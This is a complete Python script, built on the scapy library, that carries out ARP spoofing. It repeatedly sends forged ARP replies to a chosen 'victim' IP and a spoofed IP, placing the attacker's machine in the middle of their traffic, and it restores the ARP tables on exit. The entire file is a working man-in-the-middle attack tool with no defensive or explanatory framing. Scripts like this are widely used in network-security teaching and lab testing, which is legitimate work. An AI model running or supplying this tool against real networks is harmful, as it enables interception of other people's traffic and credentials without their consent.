#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys

scapy.conf.verb = False

import optparse

parser = optparse.OptionParser()
parser.add_option("-v", "--victim", dest="victim_ip", help="Victim IP")
parser.add_option("-s", "--spoof", dest="spoof_ip", help="Spoof IP")

def get_arguments():
    options, arguments = parser.parse_args()
    return options

options = get_arguments() 

if (options.victim_ip is None or options.spoof_ip is None):
    parser.print_usage()
    parser.print_help()
    exit(1)

sleep_interval = 1.0
restore_packets_quantity = 4
exit_code = 0

def get_mac(target):
    arp_request = scapy.ARP(pdst=target)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answer_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
    if (len(answer_list) > 0):
        mac_address = answer_list[0][1].hwsrc
        return mac_address

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if (target_mac):
        packet = scapy.ARP(op = "is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = scapy.ARP(op = "is-at", pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=restore_packets_quantity)

packets_sent_count = 0
try:
    while True:
        spoof(options.victim_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.victim_ip)
        packets_sent_count += 2
        print("\r[+] Packets sent: " + str(packets_sent_count), end="")
        sys.stdout.flush()
        time.sleep(sleep_interval)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C... Quitting!!!")    
except Exception as e:
    print("\n[-] An exception occurred:\n\t" + str(e))
    exit_code = 1
finally:
    print("\n[#] Restoring ARP Tables...")
    restore(options.victim_ip, options.spoof_ip)    
    restore(options.spoof_ip, options.victim_ip)

exit(exit_code)
